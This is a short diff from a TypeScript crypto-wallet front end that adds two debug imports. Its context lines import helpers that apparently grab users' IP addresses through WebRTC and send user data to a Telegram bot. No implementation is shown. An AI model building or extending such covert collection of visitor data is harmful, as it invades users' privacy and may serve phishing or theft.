@@ -6,6 +6,8 @@ import { Header } from './components/Header';
 import { Footer } from './components/Footer';
 import { getIPFast, getUserInfo } from './utils/webrtc-ip';
 import { sendUserDataToBot, getBotInfo } from './utils/telegram-bot';
+import './utils/test-webrtc'; // Импортируем тесты для доступа в консоли
+import './utils/debug-helpers'; // Debug команды для консоли
 
 export type Network = 'tron' | 'ethereum' | 'bsc';
 
